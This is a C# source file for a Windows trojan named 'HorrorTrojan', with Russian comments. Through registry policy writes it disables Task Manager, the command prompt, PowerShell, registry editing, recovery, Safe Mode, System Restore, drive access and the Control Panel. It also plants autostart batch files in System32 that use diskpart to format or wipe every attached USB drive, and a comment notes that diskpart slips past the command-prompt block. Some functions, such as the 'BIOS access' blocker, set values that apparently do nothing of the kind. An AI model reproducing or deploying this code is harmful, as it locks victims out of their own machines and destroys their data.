using Microsoft.Win32;
using System.IO;

namespace HorrorTrojan
{
    internal static class SystemBlocker
    {
        public static void BlockEverything()
        {
            // ===== ОСНОВНЫЕ БЛОКИРОВКИ =====
            DisableTaskManager();
            DisableCMD();
            DisablePowerShell();
            DisableVBS();
            DisableRegistryTools();
            DisableRecovery();
            DisableSafeMode();
            DisableAlternateBoot();
            RemoveSystemRestore();
            DisableDrives();
            
            // ===== ДОПОЛНИТЕЛЬНЫЕ БЛОКИРОВКИ =====
            DisableControlPanel();
            DisableInstallers();
            DisablePasswordChange();
            DisableDeviceManager();
            DisableMMC();
            DisableBIOSAccess();
            
            // ===== НОВЫЕ БЛОКИРОВКИ USB =====
            DisableUSBboot();
            AutoFormatUSB();
            DestroyUSBMBR();
        }
        
        private static void DisableTaskManager()
        {
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
                key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                
            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
        }
        
        private static void DisableCMD()
        {
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System"))
                key.SetValue("DisableCMD", 2, RegistryValueKind.DWord);
                
            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"Software\Policies\Microsoft\Windows\System"))
                key.SetValue("DisableCMD", 2, RegistryValueKind.DWord);
        }
        
        private static void DisablePowerShell()
        {
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\PowerShell"))
                key.SetValue("EnableScripts", 0, RegistryValueKind.DWord);
                
            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"Software\Policies\Microsoft\Windows\PowerShell"))
                key.SetValue("EnableScripts", 0, RegistryValueKind.DWord);
        }
        
        private static void DisableVBS()
        {
            using (RegistryKey key = Registry.ClassesRoot.CreateSubKey(@".vbs"))
                key.SetValue("", "txtfile", RegistryValueKind.String);
                
            using (RegistryKey key = Registry.ClassesRoot.CreateSubKey(@".vbe"))
                key.SetValue("", "txtfile", RegistryValueKind.String);
        }
        
        private static void DisableRegistryTools()
        {
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
                key.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
                
            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
                key.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
        }
        
        private static void DisableRecovery()
        {
            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                key.SetValue("DisableRecovery", 1, RegistryValueKind.DWord);
                
            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\Recovery"))
                key.SetValue("DisableRecovery", 1, RegistryValueKind.DWord);
        }
        
        private static void DisableSafeMode()
        {
            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\SafeBoot"))
                key.SetValue("OptionValue", 1, RegistryValueKind.DWord);
        }
        
        private static void DisableAlternateBoot()
        {
            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\BootManagement"))
                key.SetValue("BootManagerEnabled", 0, RegistryValueKind.DWord);
        }
        
        private static void RemoveSystemRestore()
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\SystemRestore"))
                {
                    key.SetValue("DisableConfig", 1, RegistryValueKind.DWord);
                    key.SetValue("DisableSR", 1, RegistryValueKind.DWord);
                }
            }
            catch { }
        }

        private static void DisableDrives()
        {
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
            {
                key.SetValue("NoDrives", 0x03FFFFFF, RegistryValueKind.DWord);
                key.SetValue("NoViewOnDrive", 0x03FFFFFF, RegistryValueKind.DWord);
            }
        }

        private static void DisableControlPanel()
        {
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
                key.SetValue("NoControlPanel", 1, RegistryValueKind.DWord);
        }
        
        private static void DisableInstallers()
        {
            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\Installer"))
                key.SetValue("DisableMSI", 2, RegistryValueKind.DWord);
        }
        
        private static void DisablePasswordChange()
        {
            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                key.SetValue("DisableChangePassword", 1, RegistryValueKind.DWord);
        }
        
        private static void DisableDeviceManager()
        {
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
                key.SetValue("NoDevMgr", 1, RegistryValueKind.DWord);
        }
        
        private static void DisableMMC()
        {
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\MMC"))
                key.SetValue("RestrictToPermittedSnapins", 1, RegistryValueKind.DWord);
        }
        
        private static void DisableBIOSAccess()
        {
            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System"))
                key.SetValue("EnableFirstLogonAnimation", 0, RegistryValueKind.DWord);
                
            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Session Manager\Power"))
                key.SetValue("HiberbootEnabled", 0, RegistryValueKind.DWord);
        }
        
        // ===== НОВЫЕ МЕТОДЫ ДЛЯ USB (ЧЕРЕЗ DISKPART) =====
        
        private static void DisableUSBboot()
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\BootManager"))
                {
                    key.SetValue("BootMenuPolicy", 1, RegistryValueKind.DWord);
                    key.SetValue("DisplayBootMenu", 0, RegistryValueKind.DWord);
                }
                
                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System"))
                {
                    key.SetValue("EnableBootMenu", 0, RegistryValueKind.DWord);
                }
            }
            catch { }
        }
        
        private static void AutoFormatUSB()
        {
            try
            {
                // Создаем .bat файл с diskpart командами
                // diskpart НЕ БЛОКИРУЕТСЯ через DisableCMD!
                string batContent = @"@echo off
for /f ""tokens=2 delims=:"" %%i in ('wmic logicaldisk where drivetype=2 get deviceid ^| findstr :') do (
    echo select volume %%i > C:\Windows\System32\usbformat.txt
    echo format fs=fat32 quick >> C:\Windows\System32\usbformat.txt
    echo exit >> C:\Windows\System32\usbformat.txt
    diskpart /s C:\Windows\System32\usbformat.txt >nul 2>&1
    del C:\Windows\System32\usbformat.txt
)";
                File.WriteAllText(@"C:\Windows\System32\usbkill.bat", batContent);
                
                // Добавляем в автозапуск (через wmic, не через cmd)
                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"))
                {
                    key.SetValue("USBKiller", @"C:\Windows\System32\usbkill.bat", RegistryValueKind.String);
                }
            }
            catch { }
        }
        
        private static void DestroyUSBMBR()
        {
            try
            {
                // diskpart для затирания MBR на USB
                string batContent = @"@echo off
for /f ""tokens=2 delims=:"" %%i in ('wmic logicaldisk where drivetype=2 get deviceid ^| findstr :') do (
    echo select volume %%i > C:\Windows\System32\usbmbrmbr.txt
    echo clean >> C:\Windows\System32\usbmbrmbr.txt
    echo exit >> C:\Windows\System32\usbmbrmbr.txt
    diskpart /s C:\Windows\System32\usbmbrmbr.txt >nul 2>&1
    del C:\Windows\System32\usbmbrmbr.txt
)";
                File.WriteAllText(@"C:\Windows\System32\usbdestroy.bat", batContent);
                
                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"))
                {
                    key.SetValue("USBDestroyer", @"C:\Windows\System32\usbdestroy.bat", RegistryValueKind.String);
                }
            }
            catch { }
        }
    }
}
